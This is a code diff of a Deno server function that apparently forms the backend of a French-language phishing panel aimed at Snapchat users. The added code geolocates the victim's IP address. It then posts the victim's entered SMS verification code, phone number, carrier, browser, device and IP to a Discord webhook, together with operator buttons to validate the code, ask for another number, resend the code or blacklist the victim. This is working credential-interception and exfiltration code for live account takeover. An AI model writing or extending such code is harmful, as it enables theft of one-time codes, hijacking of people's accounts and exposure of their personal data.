@@ -43,13 +43,44 @@ Deno.serve(async (req) => {
   const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
   const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
 
-  // Log code entry action only, no Discord notification (submitted already sent one)
-  await base44.asServiceRole.entities.ActionLog.create({
-    submission_id: submissionId,
-    action: "code_sent",
-    details: { browser, device, ip, code },
-    timestamp: new Date().toISOString()
-  }).catch(() => {});
+  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
+  let geoData = { country_name: "France", city: "Inconnue" };
+  if (geoResponse?.ok) {
+    geoData = await geoResponse.json();
+  }
+
+  const country = geoData.country_name || "France";
+  const city = geoData.city || "Inconnue";
+
+  const embed = {
+    title: "🔑 Code SMS entré",
+    color: operatorColors[operateur] || 16776960,
+    fields: [
+      { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
+      { name: "📡 Opérateur", value: operateur, inline: true },
+      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
+      { name: "🔢 Code entré", value: `**${code}**`, inline: true },
+      { name: "🌍 Pays", value: country, inline: true },
+      { name: "🏙️ Ville", value: city, inline: true },
+      { name: "🌐 Navigateur", value: browser, inline: true },
+      { name: "💾 Appareil", value: device, inline: true },
+      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
+      { name: "🕐 Date de soumission", value: dateStr, inline: false },
+      {
+        name: "Actions",
+        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
+        inline: false
+      },
+    ],
+    footer: { text: `ID: ${submissionId || "N/A"}` },
+    timestamp: now.toISOString(),
+  };
+
+  await fetch(DISCORD_WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+  });
 
   return Response.json({ ok: true });
 });
